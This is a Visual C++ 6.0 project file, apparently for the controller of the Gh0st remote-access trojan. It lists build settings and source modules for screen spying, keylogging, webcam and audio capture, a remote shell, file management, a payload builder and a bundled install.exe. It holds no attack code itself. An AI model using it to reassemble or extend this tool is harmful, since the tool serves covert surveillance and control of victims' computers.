# Microsoft Developer Studio Project File - Name="gh0st" - Package Owner=<4>
# Microsoft Developer Studio Generated Build File, Format Version 6.00
# ** DO NOT EDIT **

# TARGTYPE "Win32 (x86) Application" 0x0101

CFG=gh0st - Win32 Debug
!MESSAGE This is not a valid makefile. To build this project using NMAKE,
!MESSAGE use the Export Makefile command and run
!MESSAGE 
!MESSAGE NMAKE /f "gh0st.mak".
!MESSAGE 
!MESSAGE You can specify a configuration when running NMAKE
!MESSAGE by defining the macro CFG on the command line. For example:
!MESSAGE 
!MESSAGE NMAKE /f "gh0st.mak" CFG="gh0st - Win32 Debug"
!MESSAGE 
!MESSAGE Possible choices for configuration are:
!MESSAGE 
!MESSAGE "gh0st - Win32 Debug" (based on "Win32 (x86) Application")
!MESSAGE 

# Begin Project
# PROP AllowPerConfigDependencies 0
# PROP Scc_ProjName ""
# PROP Scc_LocalPath ""
CPP=cl.exe
MTL=midl.exe
RSC=rc.exe
# PROP BASE Use_MFC 6
# PROP BASE Use_Debug_Libraries 0
# PROP BASE Output_Dir "gh0st___Win32_Debug"
# PROP BASE Intermediate_Dir "gh0st___Win32_Debug"
# PROP BASE Ignore_Export_Lib 0
# PROP BASE Target_Dir ""
# PROP Use_MFC 6
# PROP Use_Debug_Libraries 0
# PROP Output_Dir "gh0st___Win32_Debug"
# PROP Intermediate_Dir "gh0st___Win32_Debug"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /MD /W3 /GX /Zi /Od /I "CJ60lib/Include" /I "../common" /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_AFXDLL" /D "_MBCS" /FR /Yu"stdafx.h" /FD /c
# ADD CPP /nologo /MD /W3 /GX /Zi /Od /I "CJ60lib/Include" /I "../common" /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_AFXDLL" /D "_MBCS" /FR /Yu"stdafx.h" /FD /c
# ADD BASE MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x804 /d "NDEBUG" /d "_AFXDLL"
# ADD RSC /l 0x804 /d "NDEBUG" /d "_AFXDLL"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 ../common/zlib/zlib.lib /nologo /subsystem:windows /debug /machine:I386 /out:"../Bin/gh0st.exe" /pdbtype:sept /libpath:"CJ60Lib/lib"
# ADD LINK32 ../common/zlib/zlib.lib /nologo /subsystem:windows /debug /machine:I386 /out:"../Bin/gh0st.exe" /pdbtype:sept /libpath:"CJ60Lib/lib"
# Begin Target

# Name "gh0st - Win32 Debug"
# Begin Group "Source Files"

# PROP Default_Filter "cpp;c;cxx;rc;def;r;odl;idl;hpj;bat"
# Begin Source File

SOURCE=..\common\Audio.cpp
# SUBTRACT BASE CPP /YX /Yc /Yu
# SUBTRACT CPP /YX /Yc /Yu
# End Source File
# Begin Source File

SOURCE=.\AudioDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\BmpToAvi.cpp
# End Source File
# Begin Source File

SOURCE=.\control\BtnST.cpp
# End Source File
# Begin Source File

SOURCE=.\include\Buffer.cpp
# End Source File
# Begin Source File

SOURCE=.\BuildView.cpp
# End Source File
# Begin Source File

SOURCE=.\include\CpuUsage.cpp
# End Source File
# Begin Source File

SOURCE=.\CustomTabCtrl.cpp
# End Source File
# Begin Source File

SOURCE=.\FileManagerDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\FileTransferModeDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\gh0st.cpp
# End Source File
# Begin Source File

SOURCE=.\gh0st.rc
# End Source File
# Begin Source File

SOURCE=.\gh0stDoc.cpp
# End Source File
# Begin Source File

SOURCE=.\gh0stView.cpp
# End Source File
# Begin Source File

SOURCE=.\control\HoverEdit.cpp
# End Source File
# Begin Source File

SOURCE=.\IniFile.cpp
# End Source File
# Begin Source File

SOURCE=.\InputDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\include\IOCPServer.cpp
# End Source File
# Begin Source File

SOURCE=.\KeyBoardDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\MainFrm.cpp
# End Source File
# Begin Source File

SOURCE=.\ScreenSpyDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\SettingsView.cpp
# End Source File
# Begin Source File

SOURCE=.\SEU_QQwry.cpp
# End Source File
# Begin Source File

SOURCE=.\ShellDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\StdAfx.cpp
# ADD BASE CPP /Yc"stdafx.h"
# ADD CPP /Yc"stdafx.h"
# End Source File
# Begin Source File

SOURCE=.\SystemDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\TabSDIFrameWnd.cpp
# End Source File
# Begin Source File

SOURCE=.\ThemeUtil.cpp
# End Source File
# Begin Source File

SOURCE=.\TrayIcon.cpp
# End Source File
# Begin Source File

SOURCE=.\TrueColorToolBar.cpp
# End Source File
# Begin Source File

SOURCE=.\WebCamDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\control\WinXPButtonST.cpp
# End Source File
# End Group
# Begin Group "Header Files"

# PROP Default_Filter "h;hpp;hxx;hm;inl"
# Begin Source File

SOURCE=.\AudioDlg.h
# End Source File
# Begin Source File

SOURCE=.\BmpToAvi.h
# End Source File
# Begin Source File

SOURCE=.\control\BtnST.h
# End Source File
# Begin Source File

SOURCE=.\include\Buffer.h
# End Source File
# Begin Source File

SOURCE=.\BuildView.h
# End Source File
# Begin Source File

SOURCE=.\CustomTabCtrl.h
# End Source File
# Begin Source File

SOURCE=.\encode.h
# End Source File
# Begin Source File

SOURCE=.\FileManagerDlg.h
# End Source File
# Begin Source File

SOURCE=.\FileTransferModeDlg.h
# End Source File
# Begin Source File

SOURCE=.\gh0st.h
# End Source File
# Begin Source File

SOURCE=.\gh0stDoc.h
# End Source File
# Begin Source File

SOURCE=.\gh0stView.h
# End Source File
# Begin Source File

SOURCE=.\control\HoverEdit.h
# End Source File
# Begin Source File

SOURCE=.\IniFile.h
# End Source File
# Begin Source File

SOURCE=.\include\IOCPServer.h
# End Source File
# Begin Source File

SOURCE=.\KeyBoardDlg.h
# End Source File
# Begin Source File

SOURCE=.\include\_OrzEx\list.h
# End Source File
# Begin Source File

SOURCE=.\include\List.h
# End Source File
# Begin Source File

SOURCE=.\MainFrm.h
# End Source File
# Begin Source File

SOURCE=.\include\_OrzEx\queue.h
# End Source File
# Begin Source File

SOURCE=.\include\Queue.h
# End Source File
# Begin Source File

SOURCE=.\Resource.h
# End Source File
# Begin Source File

SOURCE=.\ScreenSpyDlg.h
# End Source File
# Begin Source File

SOURCE=.\SettingsView.h
# End Source File
# Begin Source File

SOURCE=.\SEU_QQwry.h
# End Source File
# Begin Source File

SOURCE=.\ShellDlg.h
# End Source File
# Begin Source File

SOURCE=.\StdAfx.h
# End Source File
# Begin Source File

SOURCE=.\include\_OrzEx\syncobj.h
# End Source File
# Begin Source File

SOURCE=.\SystemDlg.h
# End Source File
# Begin Source File

SOURCE=.\TabSDIFrameWnd.h
# End Source File
# Begin Source File

SOURCE=.\ThemeUtil.h
# End Source File
# Begin Source File

SOURCE=.\Tmschema.h
# End Source File
# Begin Source File

SOURCE=.\TrayIcon.h
# End Source File
# Begin Source File

SOURCE=.\TrueColorToolBar.h
# End Source File
# Begin Source File

SOURCE=.\WebCamDlg.h
# End Source File
# Begin Source File

SOURCE=.\control\WinXPButtonST.h
# End Source File
# End Group
# Begin Group "Resource Files"

# PROP Default_Filter "ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe"
# Begin Source File

SOURCE=.\res\1.cur
# End Source File
# Begin Source File

SOURCE=.\res\2.cur
# End Source File
# Begin Source File

SOURCE=.\res\3.cur
# End Source File
# Begin Source File

SOURCE=.\res\4.cur
# End Source File
# Begin Source File

SOURCE=.\res\audio.ico
# End Source File
# Begin Source File

SOURCE=.\res\Bitmap_4.bmp
# End Source File
# Begin Source File

SOURCE=.\res\Bitmap_5.bmp
# End Source File
# Begin Source File

SOURCE=.\res\cmdshell.ico
# End Source File
# Begin Source File

SOURCE=.\res\dot.cur
# End Source File
# Begin Source File

SOURCE=.\res\gh0st.ico
# End Source File
# Begin Source File

SOURCE=.\res\gh0st.rc2
# End Source File
# Begin Source File

SOURCE=.\res\keyboard.ico
# End Source File
# Begin Source File

SOURCE=.\res\system.ico
# End Source File
# Begin Source File

SOURCE=.\res\toolbar1.bmp
# End Source File
# Begin Source File

SOURCE=.\res\toolbar2.bmp
# End Source File
# Begin Source File

SOURCE=.\res\webcam.ico
# End Source File
# End Group
# Begin Source File

SOURCE=.\res\install.exe
# End Source File
# Begin Source File

SOURCE=.\ReadMe.txt
# End Source File
# End Target
# End Project
